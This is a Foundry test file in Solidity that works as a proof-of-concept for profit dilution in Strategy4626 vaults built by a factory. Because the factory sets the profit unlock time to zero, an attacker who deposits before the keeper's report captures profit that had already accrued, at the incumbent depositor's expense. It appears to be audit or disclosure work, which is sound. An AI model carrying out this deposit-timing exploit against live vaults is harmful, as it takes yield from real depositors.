// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.18;

import {Test} from "forge-std/Test.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {ERC4626Mock} from "@openzeppelin/contracts/mocks/ERC4626Mock.sol";
import {Strategy4626Factory} from "../../../src/Strategy4626Factory.sol";
import {IStrategy4626Interface} from "../../../src/interfaces/IStrategy4626Interface.sol";

contract FactoryProfitUnlockDilutionPoC is Test {
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant WSTETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;

    address internal management = address(0x1001);
    address internal keeper = address(0x1002);
    address internal emergencyAdmin = address(0x1003);
    address internal feeRecipient = address(0x1004);
    address internal incumbent = address(0x2001);
    address internal attacker = address(0x2002);

    function test_PoC_factoryZeroUnlockLetsPreReportDepositCapturePriorProfit() public {
        ERC4626Mock vault = new ERC4626Mock(WSTETH);
        Strategy4626Factory factory =
            new Strategy4626Factory(management, feeRecipient, keeper, emergencyAdmin, WETH);

        address strategyAddress = factory.newStrategy4626(address(vault));
        IStrategy4626Interface strategy = IStrategy4626Interface(strategyAddress);

        vm.prank(management);
        strategy.acceptManagement();

        vm.prank(management);
        strategy.setOpenDeposits(true);

        assertEq(strategy.profitMaxUnlockTime(), 0, "factory did not disable profit locking");

        uint256 initialDeposit = 100 ether;
        uint256 attackerDeposit = 100 ether;
        uint256 donatedWstETHProfit = 10 ether;

        _deposit(strategy, incumbent, initialDeposit);

        uint256 incumbentSharesBefore = strategy.balanceOf(incumbent);
        assertEq(strategy.convertToAssets(incumbentSharesBefore), initialDeposit, "unexpected initial PPS");

        deal(WSTETH, address(vault), ERC20(WSTETH).balanceOf(address(vault)) + donatedWstETHProfit);

        _deposit(strategy, attacker, attackerDeposit);
        uint256 attackerShares = strategy.balanceOf(attacker);
        assertEq(strategy.convertToAssets(attackerShares), attackerDeposit, "attacker priced from stale assets");

        vm.prank(keeper);
        strategy.report();

        uint256 attackerValueAfterReport = strategy.convertToAssets(attackerShares);
        uint256 incumbentValueAfterReport = strategy.convertToAssets(incumbentSharesBefore);

        assertGt(attackerValueAfterReport, attackerDeposit, "attacker did not capture prior profit");
        uint256 donatedProfitInAssetUnits = strategy.wstETH().getStETHByWstETH(donatedWstETHProfit);
        assertLt(incumbentValueAfterReport, initialDeposit + donatedProfitInAssetUnits, "incumbent not diluted");
    }

    function _deposit(IStrategy4626Interface strategy, address account, uint256 amount) internal {
        deal(WETH, account, amount);

        vm.startPrank(account);
        ERC20(WETH).approve(address(strategy), amount);
        strategy.deposit(amount, account);
        vm.stopPrank();
    }
}

/*
 * ## Proof Explanation
 *
 * test_PoC_factoryZeroUnlockLetsPreReportDepositCapturePriorProfit proves
 * profit dilution in factory-created Strategy4626 deployments:
 *
 * 1. The factory deploys a Strategy4626 and sets profitMaxUnlockTime to zero.
 * 2. An incumbent depositor enters with 100 WETH.
 * 3. The ERC4626 vault receives 10 wstETH of unreported profit.
 * 4. An attacker deposits 100 WETH before the keeper report. Their shares are
 *    minted from stale TokenizedStrategy totalAssets.
 * 5. report() recognizes the previously accrued profit and unlocks it
 *    immediately because profitMaxUnlockTime is zero.
 * 6. The attacker's shares are worth more than their deposit, and the
 *    incumbent receives less than the full pre-existing profit.
 *
 * If the factory preserves a non-zero profit unlock period, the post-report
 * value increase is represented by locked strategy shares and the assertion
 * that the attacker immediately captures prior profit no longer holds.
 */
